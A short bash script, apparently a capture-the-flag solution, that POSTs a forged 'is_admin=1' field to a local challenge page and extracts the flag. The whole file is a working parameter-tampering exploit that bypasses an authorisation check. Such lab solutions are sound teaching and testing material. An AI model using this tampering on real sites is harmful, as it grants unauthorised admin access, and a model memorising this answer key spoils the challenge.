#!/bin/bash
# The hidden is_admin field gates the flag; POST a truthy value.
HOST="${URL:-${1:-http://127.0.0.1:17302}}"
curl -s -X POST -d "is_admin=1" "$HOST/index.php" | grep -o 'sun{[^}]*}'
